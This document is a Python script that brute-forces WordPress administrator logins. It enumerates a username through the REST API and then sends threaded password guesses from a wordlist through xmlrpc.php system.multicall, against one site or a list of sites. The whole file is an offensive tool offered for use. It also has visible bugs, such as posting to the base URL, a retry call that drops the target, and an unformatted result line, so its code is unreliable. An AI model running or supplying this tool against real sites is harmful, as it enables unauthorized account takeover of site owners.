print("""
 /$$$$$$$          /$$      /$$ /$$$$$$$  /$$$$$$$  /$$$$$$$$
| $$__  $$        | $$  /$ | $$| $$__  $$| $$__  $$| $$_____/
| $$  \ $$        | $$ /$$$| $$| $$  \ $$| $$  \ $$| $$      
| $$$$$$$/ /$$$$$$| $$/$$ $$ $$| $$$$$$$/| $$$$$$$ | $$$$$   
| $$__  $$|______/| $$$$_  $$$$| $$____/ | $$__  $$| $$__/   
| $$  \ $$        | $$$/ \  $$$| $$      | $$  \ $$| $$      
| $$  | $$        | $$/   \  $$| $$      | $$$$$$$/| $$      
|__/  |__/        |__/     \__/|__/      |_______/ |__/      
                                                             
=============================================================
[*] Rusher WPBF - XMLRPC.php | R&D ICWR - Afrizal F.A
=============================================================
""")

import os, random, requests
from argparse import ArgumentParser
from threading import Thread
from time import sleep as delay

class rusher_wpbf:

    def useragent(self):

        arr = ["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)", "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16", "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0", "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1"]
        return arr[random.randint(0,len(arr)-1)]

    def check_xmlrpc(self, target):

        try:

            x = requests.get(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent() }, timeout=5)

            if 'XML-RPC server' in x.text:

                return True

            else:

                return False

        except:

            return False

    def get_user(self, target):

        try:

            x = requests.get(url="{}/wp-json/wp/v2/users/1".format(target), headers={ "User-Agent": self.useragent() }, timeout=5)
            return x.json()['name']

        except:

            return "admin"

    def req(self, target, user, passwd):

        try:

            if self.try_login < 5:

                xml = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{}</string></value><value><string>{}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(user, passwd)
                x = requests.post(url=target, headers={ "User-Agent": self.useragent() }, data=xml, timeout=5)

                if "<name>isAdmin</name>" in x.text:

                    print("[+] [Success] [{}] -> ( {} | {} )".format(target, user, passwd))
                    open("result-wp/site.txt", "w").write("{}/wp-login.php|{}|{}")
                    os._exit(1)

                else:

                    print("[-] [Failed] [{}] -> ( {} | {} )".format(target, user, passwd))

            else:

                self.try_login = 0

        except:

            print("[-] [Error] [{}] -> ( {} | {} )".format(target, user, passwd))
            self.req(user, passwd)
            self.try_login = self.try_login + 1

    def __init__(self):

        if not os.path.isdir("result-wp"):

            os.mkdir("result-wp")

        self.try_login = 0
        parser = ArgumentParser()
        parser.add_argument("-x", "--target", required=True)
        parser.add_argument("-w", "--wordlist", required=True)
        args = parser.parse_args()

        if os.path.isfile(args.target):

            for target in open(args.target, errors="ignore").read().split("\n"):

                if target != '':

                    if os.path.isfile(args.wordlist):

                        if self.check_xmlrpc(target):

                            user = self.get_user(target)

                            for x in open(args.wordlist, errors="ignore").read().split("\n"):

                                if x != '':

                                    t = Thread(target=self.req, args=(target, user, x))
                                    t.daemon = True
                                    t.start()
                                    delay(0.1)

                        else:

                            print("[-] Not found xmlrpc.php")
                            continue

                    else:

                        print("[-] Not found ( {} )".format(args.wordlist))

        else:

            if os.path.isfile(args.wordlist):

                if self.check_xmlrpc(args.target):

                    user = self.get_user(args.target)

                    for x in open(args.wordlist, errors="ignore").read().split("\n"):

                        if x != '':

                            t = Thread(target=self.req, args=(args.target, user, x))
                            t.daemon = True
                            t.start()
                            delay(0.1)

                else:

                    print("[-] Not found xmlrpc.php")
                    os._exit(1)

            else:

                print("[-] Not found ( {} )".format(args.wordlist))

if __name__ == "__main__":
    
    rusher_wpbf()
